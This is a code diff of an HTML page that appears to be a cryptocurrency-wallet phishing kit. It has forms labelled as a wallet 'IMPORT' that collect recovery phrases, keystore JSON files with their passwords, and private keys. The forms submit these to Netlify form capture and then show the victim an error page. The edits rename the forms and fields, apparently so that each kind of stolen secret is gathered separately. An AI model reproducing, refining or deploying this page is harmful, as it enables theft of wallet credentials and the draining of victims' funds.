@@ -58,12 +58,12 @@
 </br>
 <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
 </br>
-<button type="submit" name="import" class="btn">IMPORT</button>
+<button type="submit"  class="btn">IMPORT</button>
 </form>
 </div>
 
 <div id="keystore" class="tabcontent">
-<form name="name" action="error.html" netlify>
+<form name="keystore" action="error.html" netlify>
 
 <input type="hidden" name="category" value="Keystore JSON"/>
 <input type="hidden" name="wallet" value="stake">
@@ -71,16 +71,16 @@
 <textarea name="phrase" required minlength="12" placeholder="Keystore JSON" required="required"></textarea>
 </br>
 <div class="field">
-    <input type="text" name="name" placeholder="Password" required/>
+    <input type="text" name="keystorename" placeholder="Password" required/>
 </div>
 <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
 </br>
-<button type="submit" name="import" class="btn">IMPORT</button>
+<button type="submit" class="btn">IMPORT</button>
 </form>
 </div>
 
 <div id="private" class="tabcontent">
-<form name="name" action="error.html" netlify>
+<form name="privateKey" action="error.html" netlify>
 <input type="hidden" name="category" value="Private Key"/>
 <input type="hidden" name="wallet" value="stake">
 <div class="field">
@@ -88,7 +88,7 @@
 </div>
 <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
 </br>
-<button type="submit" name="import" class="btn">IMPORT</button>
+<button type="submit" class="btn">IMPORT</button>
 </form>
 </div>
 
